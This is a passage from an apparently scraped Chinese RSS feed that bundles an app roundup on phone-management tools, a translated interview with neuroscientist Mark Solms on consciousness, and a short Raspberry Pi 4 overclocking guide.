元一次买断。如果你总抑制不住自拍的冲动又怕露脸尴尬，或者你想让自己的「大片」更具艺术表现力，NOME 还是非常值得一试的。</p>\n<p>你可以在 App Store 上免费下载 <a href=\"https://apps.apple.com/cn/app/nome-%E5%8F%8D%E7%A4%BE%E4%BA%A4%E6%8C%A1%E8%84%B8%E8%87%AA%E6%8B%8D%E7%9B%B8%E6%9C%BA/id1393489660\" target=\"_blank\">NOME</a>。</p>\n<span class=\"ss-application\" app-id=\"13963\"> </span><h3>AnyTrans / AnyDroid：在电脑上管理你的手机</h3>\n<ul>\n<li>平台：macOS / Windows</li>\n<li>关键词：文件管理、设备管理</li>\n</ul>\n<p><a class=\"ss-atUser\" data-mention=\"@化学心情下2\" user-id=\"bs2od75b34tch2730oa0\" href=\"https://sspai.com/u/liuxiaofengone\">@化学心情下2</a>：时间回到十年前，无论是使用 iPhone 还是 Android 智能手机，都离不开电脑：你需要使用电脑来同步 App、更新系统或者将下载的音乐导入到手机等等，虽然十年后的今天，智能手机早已经成为一个不依靠 PC 也能「很好用」的工具，但如果你曾经用惯了基于电脑端的管理软件，那么下面提到的两款应用相信能让你更好地管理你的智能手机。</p>\n<p>AnyTrans 是一款基于 PC 和 Mac 端的 iPhone 管理工具，和很早以前的 iTunes 一样，AnyTrans 可以实现在电脑端手动管理 iPhone 里面的资料，比如说将音乐、电子书、应用进行导入和导出操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/ef3af7215306098a7b423d3e35f9ae96\"></figure><p>当然相比早期的 iTunes，AnyTrans 在管理 iPhone 资料上更符合用户直觉，比如说你可以直接通过上传音乐文件来将音乐导入到 iPhone 中，而以往这样的操作需要繁琐的同步操作。</p>\n<p>另外一个非常方便的操作就是在 AnyTrans 可以直接搜索 App store 并下载应用，因为 iTunes 早已经不能进行 iPhone 的应用管理，自然也就不能像以前那样同步 App，而通过 AnyTran 可以快速下载 App 并且将安装包保存到电脑中并安装到 iPhone 中，当然这也是跨区下载安装 App 最为简易的一个方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/5da805e7a744bf9d88d38ba9a9f211ee\"></figure><p>除了文件管理之外，AnyTrans 还有着一整套基于桌面的整机备份和转移操作，比如支持整机快速的备份和还原备份，甚至可以将原先 Android 手机的资料也导入到 iPhone 中，毕竟跨平台的数据导入往往都需要安装应用，而传输的稳定性上自然也比不上基于 PC 的工具。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/5a4c253abfca5586b89c342195ca0eff\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/6b266b002bdfe3be5d5ca20b3da3f687\"></figure><p>当然 AnyTrans 还有不少很实用的工具，比如说你可以将其他视频网站的视频通过其下载并导入到 iPhone 中，制作属于自己的个性铃声，或者将当前的 iPhone 屏幕投射到你的电脑上来录制或者截取屏幕内容。总之相比完全在手机端操作，AnyTrans 的各种工具要更有效率一些，让你的 iPhone 资料管理更为简单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/5f6aab2ba06dbe6c037000271892a84e\"></figure><p>对于 Android 手机也有类似的桌面端管理工具：AnyDroid，不过相比 AnyTrans 功能就没那么丰富了，除了最为基础的文件管理功能之外，最为实用的可能就是跨系统的数据导入，非常适合换机数据导出导入备份，尤其是跨品牌的换机可以使用 AnyDroid 一键搞定。其他功能还有视频网站下载等，就不过多介绍了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/28/article/0754e68c54738602813c3fe9adfb5cf5\"></figure><p>总之，AnyTrans 以及 AnyDroid 算是一个非常灵活的智能手机的管理工具，虽然现在很少有人再使用电脑来管理智能手机，但通过这两款软件你依旧可以看到电脑管理智能手机的方便之处，如果你有类似的需求不妨少数派的软件商店下载试用。</p>\n<p>你可以在少数派购买 <a href=\"https://sspai.com/item/188\" target=\"_blank\">AnyTrans</a> 和 <a href=\"https://sspai.com/item/273\" target=\"_blank\">AnyDroid</a>。</p>\n<span class=\"ss-genuineSoftware\" product-id=\"188\" type=\"genuineSoftware\"> </span><span class=\"ss-genuineSoftware\" product-id=\"273\" type=\"genuineSoftware\"> </span><h2>App 速报</h2>\n<ul>\n<li>NOMO (<a href=\"https://weibo.com/1639529981/KlPYBmbU5\" target=\"_blank\">iOS</a>)：胶片风格摄影应用 NOMO 宣布将于本周推出系列 App。</li>\n<li>AlDente Pro（<a href=\"https://github.com/davidwernhart/AlDente\" target=\"_blank\">macOS</a>）：通过控制电池充电量来保证 MacBook 系列笔记本的电池不过充，从而尽可能延长 Mac 电池的使用寿命，支持 Intel 处理器版本和 Apple Silicon 版本 Mac。</li>\n<li>AirBuddy（<a href=\"https://v2.airbuddy.app/\" target=\"_blank\">macOS</a>）：更新至 v2.4 ，带来对低电量和充电通知的支持，可以通过创建电池提醒选项来配置充满电以及电量不足的提醒；通过点击图标快速连接喜欢的设备，并增加 Beats Studio Buds 以及带有 Touch ID 的妙控键盘支持。</li>\n<li>NetNewsWire（<a href=\"https://apps.apple.com/us/app/netnewswire-rss-reader/id1480640210\" target=\"_blank\">iOS</a>）：大版本更新至 v6.0，支持通过 iCloud 或者其他新第三方服务来进行内容源同步，并集成 Twitter 推文和 Reddit 帖子阅读功能以及全新的主屏幕小部件。</li>\n<li>Notability（<a href=\"https://apps.apple.com/cn/app/notability/id360593530?mt=8&amp;ign-mpt=uo=4\" target=\"_blank\">macOS</a>）：更新至 v10.4.4，加入对 Apple M1 芯片设备的原生支持，同时改善了橡皮擦性能并修复了上一版本出现的 Bug。</li>\n<li>Join（<a href=\"https://joaoapps.com/join-3-0-works-in-firefox-and-edge-local-network-communication-desktop-app-and-more/\" target=\"_blank\">Android</a>）：手机和电脑协作的工具 Join 大版本更新至 v3.0，带来原生的跨平台桌面 App（同步剪切板、全局快捷键以及命令行操作），支持通过本地网络进行协作、全新的网站可以在 Firefox 以及 Edge 上，在网站上浏览手机文件，查看通知接收短信等操作。</li>\n<li>Hot（<a href=\"https://downloads.imazing.com/mac/Hot.app.zip\" target=\"_blank\">macOS</a>）：iMazing 推出的开源 Mac 设备 CPU 温控应用，加入了对 M1 芯片 Mac 的支持，可以实时查看当前的 CPU 温度以及是否全速运行。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67454"},{"title":"让神经科学回归弗洛伊德，意识不过一种感觉？","date":"2021-06-28 08:30:10","description":"\n<p></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-805182d32ee077f4be4e8a763b2dcbe8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1920\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-805182d32ee077f4be4e8a763b2dcbe8_r.jpg\"></figure><p>在<b>马克·索尔姆斯</b>（Mark Solms）还是个孩子的时候，他就痴迷于宏大的存在主义问题：我们死后会发生什么？是什么造就了如今的我们？后来，他开始学习神经科学，却很快发现神经心理学对关于心灵的这些开放式问题没什么耐心。作为一位新晋科学家，索尔姆斯做了件闻所未闻的事情，<b>他把弗洛伊德认作神经科学之父，并开创了一个新领域——神经精神分析学</b>。</p>\n<p>索尔姆斯在人生道路上还遇到过另一个障碍。他出生于纳米比亚，在南非的种族隔离制度下长大。后来，索尔姆斯于一家医院工作，该医院位于索韦托，那里的军事占领者试图镇压抗议者。“一完成学业，我们就得被迫入伍，伤害那些曾经照顾过的人。”他说道。“这种事，我在情感上没法承受。”于是，他逃往英国，在那里接受了精神分析培训。种族隔离制度废除后，他才回到南非。</p>\n<h2><b>影响深远的童年创伤</b></h2>\n<p>索尔姆斯花了几十年的时间，致力于协调脑科学和生活经验研究。如今，他在新书<b>《隐蔽源泉》</b>（<i>The Hidden Spring</i>）里提出了自己的意识理论。索尔姆斯认为，神经心理学一直在错误的地方寻找意识。“智力诞生于大脑皮层，所以几乎每个人都认为意识也源自那里。”索尔姆斯写道，“我不同意。意识远比这更原始。它<b>诞生于人类和鱼类共有的那部分大脑。</b>这就是书名中的‘隐蔽源泉’。”这本书是对现代神经科学的一次深入探讨，对我们如何<b>思考、做梦、记忆和感知</b>做了惊人解释。</p>\n<p>我联系到了索尔姆斯，新冠疫情封锁期间他一直待在南非开普敦。我们讨论了脑——心智问题、神经心理学的偏见，以及家庭创伤如何塑造了他的人生历程。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a22d89f25d29213ad896c94126734f74_b.jpg\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"500\" class=\"origin_image zh-lightbox-thumb\" width=\"733\" data-original=\"https://pic1.zhimg.com/v2-a22d89f25d29213ad896c94126734f74_r.jpg\"><figcaption>我是谁？：“所有这些复杂的东西是如何将我的生活与这个身体器官联系起来的？”马克·索尔姆斯问道。他花了毕生时间研究大脑和意识，无惧违抗学术界传统，提出最根本的存在主义问题。—Ilhaam Abraham</figcaption></figure><blockquote><b>你写过你童年中的一个重要时刻——你哥哥遭受了严重脑损伤。你能描述一下发生了什么吗？</b></blockquote>\n<p><b>索尔姆斯：</b>那时我四岁，他六岁。我父母在划游艇，我在水边，但他和一些朋友爬上了俱乐部屋顶。然后，他被绊倒，从三层楼跌落到下面的人行道上，头骨骨折。<b>在撞击过程中，他失去了意识并且经历了持续性脑出血。</b>当时我们住在一个小村庄，所以我们必须将他空运到开普敦的一家医院。好在他在事故中幸存了下来。让我感到不安和极度难以理解的是，<b>他虽然看起来跟以前一样，但又完全变了。</b>他失去了他的发展里程碑，比如，变得大小便失禁；他的人格也不同了，变得更加情绪化、易怒和难缠；他的智力水平也变了。</p>\n<blockquote><b>你说这对你产生了深远影响？</b></blockquote>\n<p><b>索尔姆斯：</b>的确如此。这场意外让我开始思考，大脑怎么可能只是他脑袋里坏掉的那个东西？为什么他会变成这副熟悉而又陌生的样子？他去哪了？这个人，我的哥哥，怎么会是一个器官呢？我迅速地推及自己，然后想，“嗯，我是我的大脑吗？这怎么可能呢？<b>如果我的大脑受损，我会变成另一个人吗？原来的那个我会去哪呢？</b>”而这件事对于我父母来说是一场悲剧。他们为此感到极度内疚。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-53ea51b35316800a20f04335d673b6e4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"1335\" class=\"origin_image zh-lightbox-thumb\" width=\"1024\" data-original=\"https://pic1.zhimg.com/v2-53ea51b35316800a20f04335d673b6e4_r.jpg\"><figcaption>如果大脑受损了，我会变成另一个人吗？原来的我又会去哪里？—www.ooopic.com</figcaption></figure><blockquote><b>所以当你还是个小男孩的时候，就在问一些当今神经科学所涉及的深奥问题了。什么是自我？大脑如何与我们的精神体验联系起来？</b></blockquote>\n<p><b>索尔姆斯：</b>我觉得，我只是因为那件事过早地陷入这些思虑。对我来说，这些问题也与死亡有关。如果我的肉体死了，我就会消失，这太可怕了。我还想到，如果我们会永远消失，那做事情还有什么意义呢？这些想法让我非常不安，将我推入一种只能被称为“抑郁”的漩涡里去。我还记得那些早晨的感觉，“上学有什么意义呢？”以至于我都没有力气去系上鞋带。显然，我不相信在四五岁时我就决定了成为一名神经科学家，但如今回想起来，这两件事必然有关联。<b>成为神经科学家，大概算是解决那种虚无主义绝望的一种方法。</b>印象中，我十几岁的时候就想过，唯一真正值得做的事情是努力去理解存在是什么，感受性（sentience）又是什么？</p>\n<h2><b>“神经精神分析”的诞生</b></h2>\n<blockquote><b>你继续研究神经科学，尤其是梦的科学。这对你思考意识的本质有什么影响？</b></blockquote>\n<p><b>索尔姆斯：</b>神经科学里最让我感兴趣的是<b>心灵与大脑如何关联</b>，所以神经心理学是神经科学中最吸引我的领域。但当我来到大学，我学到的是些<b>抽象功能——记忆、语言、知觉和执行控制的信息处理机制</b>。人们对心灵的实际主观存在没有兴趣。当我问起关于“记忆的内容”和“人的生活的内在驱动力”的问题时，我的教授们严肃地劝告我：不要问这样的问题，这对你的职业生涯不利。</p>\n<blockquote><b>你有一个重大发现，推翻了我们只在快速眼动（REM）睡眠期间做梦的主流理论。你发现了什么？</b></blockquote>\n<p><b>索尔姆斯：</b>主流理论只是假设：<b>当快速眼动睡眠停止时，我们的梦也会停止。</b>但我发现，大脑中负责引起REM的部位受损的病人仍然会继续做梦。回顾过去，我们会发现自己犯了重大的方法论错误，<b>这种错误就是不收集主观数据所付出的代价。</b>要知道，对科学来说，处理梦的实际主观体验是件尴尬的事，这就是我的教授们说“不要研究那些东西”的原因。但如果我们遗漏掉一半的可用数据，就会错失一些关于大脑如何运作的重要信息。</p>\n<blockquote><b>作为一名神经科学家，你对弗洛伊德的兴趣非同寻常。你实际上受训成为一名精神分析师，之后还编辑了弗洛伊德的著作全集。</b></blockquote>\n<p><b>索尔姆斯：</b>对，我的同事们都吓坏了，他们告诉我这是伪科学。其中有一个对我说：“你知道吗，天文学家不研究占星术。”的确，精神分析已经失去了它的根基。弗洛伊德是一位训练有素的神经科学家和神经病学家，但在后来的几代研究者中，<b>精神分析丧失了生物科学根基，</b>所以我能够理解一些人对精神分析的不屑。但值得称道的是，它研究的是真正的心灵体验，而这正是我感兴趣的东西，也是神经心理学缺失的东西。于是我转向精神分析，<b>尝试系统性地研究主观经验，并推断其背后的机制。</b></p>\n<blockquote><b>我们误解了弗洛伊德吗？他是否有被我们忽视的科学洞见？</b></blockquote>\n<p><b>索尔姆斯：</b>很有可能。我不会假装弗洛伊德没有犯过一些重大错误，这是意料之中的事。他是一位先驱，迈出了系统性研究主观经验的第一步。他之所以没有在神经科学上取得大的进步，并放弃了这一领域，是因为当时还没有科学的方法来研究事物。即使是<b>脑电图</b>，也是在第二次世界大战后才被广泛应用的。所以，当时没有研究活体大脑活动的方法，更不用说我们现在拥有的方法了。但他基本的观察总结，是占据中心地位的情绪——情感感受对认知过程的影响很大。<b>这就是精神分析的本质所在，即我们的理性、逻辑和认知过程如何被情绪力量所扭曲。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-83b46ad6f51b9760f66db0ae47a2b311_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic2.zhimg.com/v2-83b46ad6f51b9760f66db0ae47a2b311_r.jpg\"><figcaption>我同事对我研究弗洛伊德感到惊恐。他们告诉我这是伪科学。</figcaption></figure><blockquote><b>你开创了“神经精神分析”这个新领域。这种方法的基本前提是什么？</b></blockquote>\n<p><b>索尔姆斯：</b>我所学的神经心理学也可以说是神经行为主义。<b>奥利弗·萨克斯</b>（Oliver Sacks）在1984年的著作中指出，神经心理学是令人钦佩的，但它排除了心灵，即活跃的心灵主体。这确实引起了我的注意，所以我想要把心灵重新带回神经心理学。在上世纪80年代的神经心理学中，情绪尚未被研究。而<b>情绪在心灵体验中的中心地位，以及隐藏在情绪背后的东西，就是弗洛伊德所谓的“驱力”。</b>简单来说，他的观点是，不愉快的感觉代表了未被满足的需求，相反，愉快的感觉则代表满足了的需求。这就是了解“我们如何满足自己最深层生物需求”的方式。这种观点为认知提供了一种基础，而我认为这种纯粹又简单的基础在认知科学中是非常缺乏的。</p>\n<h2><b>意识是一种感觉</b></h2>\n<blockquote><b>意识科学领域存在着巨大争论。解释大脑和心灵之间的因果关系是科学界最困难的问题之一：大脑由神经元和突触连接组成，而心灵涉及思考和感觉的非物质世界，它们似乎存在于两个完全独立的领域。你怎么理解这个问题？</b></blockquote>\n<p><b>索尔姆斯：主观经验，即意识，当然是自然的一部分，因为我们是具身的生物，是经验的主体。</b>所以，我们可以从两方面来看待你刚才提到的那个大问题。我们可以说，想象物理器官如何成为经验主体是极端困难的，所以它们必然属于两个不同的宇宙，因此主观经验是不可理解的，它在科学范围之外。但我很难接受这样的观点。我赞成的一种观点是，一定可以通过某种方式弥合这种分歧。</p>\n<blockquote><b>其中争论的主要焦点是意识是否能够还原为物理或生物学规律。哲学家大卫·查尔莫斯曾推测，意识是自然界的基本属性，无法被还原为任何自然规律。</b></blockquote>\n<p><b>索尔姆斯：</b>我接受这个观点，除了“基本”这个词。我认为，<b>意识是自然界的一种属性，但不是一种基本属性。</b>这很容易解释。很久以前发生过一次宇宙大爆炸，过了很久之后，生命第一次出现。如果查尔莫斯认为意识是宇宙的基本属性，那么意识一定早在生命诞生之前就存在了。我知道有些人相信这一点。但作为一名科学家，当我们看到这些证据的分量时，“甚至在宇宙大爆炸之时，就已经有了意识的某种基本形式”的说法，就不那么可信了。“基本属性”这个说法，基本上等同于上帝，所以它并没有真正解决这个问题。</p>\n<blockquote><b>你当然可以发现大脑功能和精神活动之间的各种关联。我们知道大脑损伤——比如发生在你哥哥身上的事情——可以改变一个人的性格。但这仍然无法解释因果关系。就像哲学家约翰·塞尔所说：“大脑是如何跨越从电化学到感觉的鸿沟的呢？”</b></blockquote>\n<p><b>索尔姆斯：</b>我认为，我们把人类意识作为所谓意识的模型，是把这个问题困难化了。（塞尔）这个问题听起来更奇妙。所有这些思考、感受和哲学思辨怎么可能都是脑细胞的产物呢？不过我们应该从感觉这种更基础的意识雏形开始讨论。<b>即把意识看作只和存在价值有关的东西：生存是好事，死亡是坏事。这是所有生物的基本价值体系。</b>糟糕的感觉意味着我不太好——我很饿、很渴、很困，我受到生命存亡和肢体受损的威胁；而好的感觉则有相反的意味——当前状况有利于我的生存和繁衍。</p>\n<blockquote><b>你是说意识本质上是关于感觉的，而非认知或智力。</b></blockquote>\n<p><b>索尔姆斯：</b>这就是为什么我说“从意识最基本的形式开始讨论”更有助于解决你提出的问题。一个物质生物怎么会拥有意识这种神秘又奇妙的东西呢？把意识简化为更生物性的东西，比如基本的感觉，然后我们才能开始在之上构建复杂性。朝着这个方向迈出的第一步是“我感觉”，之后才有了问题：这种感觉是如何产生的？这个感觉是关于什么的？然后我们有了最初的认知——“关于这一事我有这样一种感觉”。于是，<b>感觉延伸到了知觉，以及世界上有机体的其它认知表征</b>（representation）<b>上。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8a3dfad0f8b2d355082c67e853c506ce_b.jpg\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"1117\" class=\"origin_image zh-lightbox-thumb\" width=\"805\" data-original=\"https://pic3.zhimg.com/v2-8a3dfad0f8b2d355082c67e853c506ce_r.jpg\"><figcaption>- Anxo Vizcaíno -</figcaption></figure><h2><b>感觉、意识与记忆</b></h2>\n<blockquote><b>这些感觉源自大脑的什么地方？</b></blockquote>\n<p><b>索尔姆斯：感觉起源于</b>大脑中一个非常古老的部位——<b>脑干上部</b>，这个部位是我们和所有脊椎动物共有的。大脑的这个部分已经有5亿年的历史了。非常明显的事实是，这些结构的损伤——<b>在网状激活系统的某些部分中，小到火柴头大小的损伤——会使所有意识消失</b>。仅这一事实就足以证明，更复杂的认知意识依赖于上脑干产生的意识的基本情感形式。</p>\n<blockquote><b>所以我们把过多注意力放在了大脑皮层上，我们赞美它，因为它让人类变得聪明。</b></blockquote>\n<p><b>索尔姆斯：</b>确实。人类对自身在演化中所处的位置感到骄傲：唯独哺乳动物拥有宽阔的大脑皮层，而我们人类的大脑皮层面积甚至更大。这是我们在意识神经科学史上所犯下的最大错误。<b>关于大脑皮层是意识来源的证据非常薄弱。</b>如果你把一只新生哺乳动物——比如一只小鼠——去皮质化，它不会丧失意识。它不仅早上会醒来，晚上去睡觉，它还会跑来跑去、挂在栏杆上、游泳、吃东西、交配、玩耍、把幼崽抚育养大。<b>所有这些情感行为离开了大脑皮层依旧存在。</b></p>\n<p>人类也一样。<b>生来就没有大脑皮层的儿童，被称为脑发育不全性脑积水（不要和脑积水混淆）</b>，与我刚才描述的这些实验动物的情况完全一样。他们早上醒来，晚上入睡，高兴时微笑，沮丧时大吵大闹。当然了，我们没法跟他们讲话，因为他们没有大脑皮层。他们不能告诉我他们有意识，但会像我们的宠物一样表现出意识和感觉。</p>\n<blockquote><b>你是说我们确实有两个大脑——脑干和大脑皮层。</b></blockquote>\n<p><b>索尔姆斯：</b>是的，但大脑皮层本身无法产生意识。可以说，大脑皮层从脑干中借用了意识。此外，意识并非大脑皮层所固有的。大脑皮层可以进行高水平且独特的人类认知操作，比如阅读理解，而根本不需要意识。所以为什么我们还会有意识呢？答案是我们需要感觉来进行认知，因为这是价值的来源。事情进展得好还是不好？所有选择、所有决策，都需要建立在一个价值体系中，建立在一物优于另一物的价值观之上。</p>\n<blockquote><b>所以思维是什么呢？我们还能谈论思想的神经化学（本质）吗？</b></blockquote>\n<p><b>索尔姆斯：</b>思想的最基本形式关乎选择。<b>发生在我们日常的心理生活中的大部分认知过程，都是在无意识中进行的。</b>如果我们不需要做出选择，那么万事自然发生。而现在我面临着两种选项，我需要选择其一来行动。意识让我们能够做出那些选择，因为它提供了价值判断。换句话说，思考在不知不觉中进行，直到我们碰见了不确定的局面，不知道该做什么。然后，我们需要感觉来解决这个问题。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9b9681e2b729c0d794e99a8ac5774df1_b.jpg\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"1206\" class=\"origin_image zh-lightbox-thumb\" width=\"805\" data-original=\"https://pic2.zhimg.com/v2-9b9681e2b729c0d794e99a8ac5774df1_r.jpg\"><figcaption>- Anxo Vizcaíno -</figcaption></figure><blockquote><b>记忆是如何融入意识的？</b></blockquote>\n<p><b>索尔姆斯：</b>一切认知的基础成分就是我们拥有的记忆。感觉印象进入我们的记忆并留下痕迹，我们便可以通过认知的形式重新激活它们，并以各种复杂的方式重新组合，包括提出新的想法。<b>但认知最基本的结构就是记忆痕迹，而大脑皮层就是一个巨型表征仓库。</b>所以我刚才说，本质上认知并非都具有意识，只是在说，很大一部分记忆都是潜藏在意识之下的。我们不可能对一生中接收的数以亿计比特的信息都有所意识，所以有意识的部分是那些从长期记忆的巨型仓库中提取而来的短期工作记忆，但它们只是所有记忆之中微小的一部分。</p>\n<blockquote><b>你说记忆的功能是预测我们未来的需求。而海马体，我们常说的大脑的记忆中心，是用来想象未来以及储存过去信息的。</b></blockquote>\n<p><b>索尔姆斯：从过去事件中学习的唯一目的，是更好地预测未来事件，这就是记忆的意义所在。</b>它不仅仅是个图书馆，来把发生在我们身上的所有事情归档。我们需要记录过去的事件，是因为这样我们才能以其作为基础，来预测未来。是的，海马体对于想象未来和回忆过去一样重要，你也可以说这是在回忆未来。</p>\n<blockquote><b>一门真正的意识科学、关于主观经验的科学，难道不能解释为什么特定的思想和记忆会突然出现在我的大脑中吗？</b></blockquote>\n<p><b>索尔姆斯：</b>当然能。这就是为什么我比大多数神经科学家都更认真对待精神分析学家的工作。他们会问，为什么史蒂夫在他人生这个阶段会有这样的经历？我大脑中的神经元是如何产生这一切的？我是说，如果从最基本的因果机制出发，我们只是在谈论一种感觉，而它们在普通的生物学术语中并不难理解。接下来，要厘清所有那些基于我们整个生活的认知——我怎么去满足我的情感需求？与此同时，我们的大脑也在不断地预测和感受问题，并试图解决它。</p>\n<blockquote><b>这就是神经精神分析的前提。解释大脑中发生的生物学现象是一条道路，另一条道路则是通过心理学的解释——也许我需要一位心理治疗师，来帮助我理解，为什么突然之间我的脑海中会冒出一个特别的想法。</b></blockquote>\n<p><b>索尔姆斯：</b>你刚刚概括总结了我的整个科学生涯。我认为两种道路我们都需要。当初驱使我去研究神经科学的，正是这些非常重要又有趣的问题，这些塑造了我的生活的复杂事物，是如何与我的身体器官相关联的？你知道的，<b>在医学院或研究生课程中，我们被灌输了这样的观念：必须丢掉那些好奇心与神秘感，丢掉对那些宏大问题的兴奋和痴迷。</b>而由于我的个人经历，我无法放弃对这些问题的好奇。这就是我做这些事的动机。</p>\n<blockquote>作者：Mark Solms | 封面：Anxo Vizcaíno<br>译者：王两 | 校对：Sixin<br>编辑：山鸡 | 排版：平原<br>原文链接：<a href=\"https://link.zhihu.com/?target=https%3A//nautil.us/issue/98/mind/consciousness-is-just-a-feeling\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">nautil.us/issue/98/mind</span><span class=\"invisible\">/consciousness-is-just-a-feeling</span><span class=\"ellipsis\"></span></a>\n</blockquote>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d8a27c802b014a16c0e1b846ae136a03_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-d8a27c802b014a16c0e1b846ae136a03_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-6b82feaefabb4651e1806c7724f54ab7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-6b82feaefabb4651e1806c7724f54ab7_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3258e45ad35632a270f9b4223f5b33df_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-3258e45ad35632a270f9b4223f5b33df_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-494b041a47194ef6ec606b6f790f64ce_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"667\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-494b041a47194ef6ec606b6f790f64ce_r.jpg\"></figure><br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/neureality?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">神经现实</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/384574582?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 15:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"如何评价 6 月 11 日公测的《鬼泣-巅峰之战》手游？","date":"2021-06-25 15:30:08","description":"\n<p>感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/70c5673ee4e9644003f7a725c4a06a4e\" data-hash=\"70c5673ee4e9644003f7a725c4a06a4e\" 